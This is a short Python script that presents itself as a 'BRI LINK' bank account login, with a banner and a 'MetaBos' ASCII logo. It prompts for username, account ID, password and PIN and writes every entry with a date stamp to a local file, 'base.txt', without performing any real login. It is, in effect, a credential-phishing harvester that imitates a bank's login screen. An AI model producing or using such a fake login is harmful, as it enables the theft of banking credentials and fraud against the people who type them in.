#Programs BRI Login Account;
print("------------------------------------")
print("--------------BRI LINK--------------")
print("------------------------------------")
print("Version 1.0")
print("")

#import module
import pyfiglet

ascii_assasin = pyfiglet.figlet_format("MetaBos")
print(ascii_assasin)

#string ( input, execute, end )
users = open("base.txt", "a")
import datetime;
#Input
name = input("Username :")
id = input("ID-ACT   :")
pw = input("Password :")
pin = input("PIN-ACT  :")

#Execute
e = datetime.datetime.now()
users.write("\nUsername :" + str(name))
users.write("\nID-ACT   :" + str(id))
users.write("\nPassword :" + str(pw))
users.write("\nPIN-ACT  :" + str(pin))
users.write(e. strftime("\nDATE     :%d-%m-%Y"))
users.write("\n-----------------------------------")
#end
users.close()

